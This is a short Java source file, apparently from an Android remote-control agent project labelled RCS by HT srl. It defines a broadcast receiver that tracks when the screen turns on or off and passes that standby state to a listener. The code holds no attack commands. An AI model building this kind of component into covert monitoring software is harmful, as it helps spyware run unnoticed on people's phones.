/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.dvci.Standby;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;

public class BSt extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorStandby"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}
		final boolean on = intent.getAction().equals(Intent.ACTION_SCREEN_ON);

		if (Cfg.DEBUG) {
			Check.log(TAG + " standby notification, action: " + intent.getAction() + "standBy is:" + on );//$NON-NLS-1$
		}

		ListenerStandby.self().dispatch(new Standby(on));
	}
}
